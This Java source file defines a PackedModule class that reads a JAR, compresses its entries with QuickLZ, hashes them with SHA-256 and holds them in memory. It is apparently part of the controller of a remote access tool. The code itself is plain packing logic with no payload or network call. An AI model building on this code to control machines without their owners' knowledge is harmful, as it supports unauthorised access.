package jrat.controller.modules;

import jrat.common.Logger;
import jrat.common.codec.Hex;
import jrat.common.compress.QuickLZ;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;
import java.util.jar.JarEntry;
import java.util.jar.JarInputStream;
import java.util.jar.Manifest;

public class PackedModule extends BaseModuleLoader {

    private String mainClass;
    private Map<String, byte[]> packedResources = new HashMap<>();
    private byte[] sum;

    public PackedModule(File file) {
        super(file);
    }

    /**
     * Load the JAR, compress its entries and store in memory
     * @throws Exception
     */
    public void load() throws Exception {
        this.packedResources.clear();

        int total = 0;
        int totalUncompressed = 0;

        JarInputStream jis = new JarInputStream(new FileInputStream(super.file));

        Manifest mf = jis.getManifest();
        this.mainClass = mf.getMainAttributes().getValue("Main-Class");

        Logger.log("packing " + file.getName());

        MessageDigest digest = MessageDigest.getInstance("SHA-256");

        JarEntry entry;
        while ((entry = jis.getNextJarEntry()) != null) {
            String name = entry.getName();

            int size = (int) entry.getSize();

            if (size == 0) {
                continue;
            }

            ByteArrayOutputStream out = new ByteArrayOutputStream(size == -1 ? 1024 : size);

            int count;
            byte[] buffer = new byte[1024];
            while ((count = jis.read(buffer)) != -1) {
                out.write(buffer, 0, count);
            }

            out.close();

            byte[] array = out.toByteArray();

            digest.update(array);

            int uncompressedSize = array.length;
            totalUncompressed += array.length;

            array = QuickLZ.compress(array, 3);
            total += array.length;
            Logger.log("\tclass " + name + " (" + uncompressedSize + " -> " + array.length + " bytes)");

            packedResources.put(name, array);
        }
        jis.close();

        this.sum = digest.digest();

        Logger.log("\ttotal: " + total + " bytes (" + (((float) total / (float) totalUncompressed) * 100f) + "%)");
        Logger.log("sha256: " + Hex.encode(this.sum));
    }

    public String getMainClass() {
        return this.mainClass;
    }

    public Map<String, byte[]> getPackedResources() {
        return this.packedResources;
    }

    public byte[] getSum() {
        return this.sum;
    }
}
